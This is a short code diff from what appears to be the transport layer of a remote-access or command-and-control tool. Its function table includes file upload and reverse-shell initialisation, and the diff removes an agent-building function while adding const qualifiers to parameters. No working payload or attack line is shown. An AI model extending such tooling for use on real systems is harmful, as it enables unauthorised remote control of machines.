@@ -18,7 +18,7 @@ typedef struct _dat_str {
 transport_t transport_api = {
     send_ok, send_err, listen, read, write,
     upload_file, init_reverse_shell, 
-    determine_handler, get_dat_siz, init, end, nullptr, 
+    determine_handler, get_dat_siz, init, end, 
     get_name, get_id, set_port, get_agent_name
 };
 
@@ -161,7 +161,7 @@ int determine_handler(void* instance_struct){
 }
 
 /*Uploads a file to some connected entity*/
-int upload_file(void* instance_struct, char *ptr, int is_module){
+int upload_file(void* instance_struct, const char *ptr, int is_module){
     data_struct *dat_structure = (data_struct*)instance_struct;
 
 
@@ -236,13 +236,6 @@ int upload_file(void* instance_struct, char *ptr, int is_module){
     free(enc_data);
 
     return 0;
-}
-    
-/* Function that would create an agent */
-void make_agent(void* instance_struct, char *dat_ptr, char *d_ptr){
-    data_struct dat_structure = *(data_struct*)instance_struct;
-
-    AgentInformationHandler::compile(dat_ptr, d_ptr);
 }
 
 int init_reverse_shell(void* instance_struct, char *id){
@@ -448,7 +441,7 @@ int read(void* instance_struct, char **buff, int length){
         
 }
 
-int write(void* instance_struct, char *buff, int length){
+int write(void* instance_struct, const char *buff, int length){
     data_struct *dat_structure = (data_struct*)instance_struct;
 
     int rc = 0;
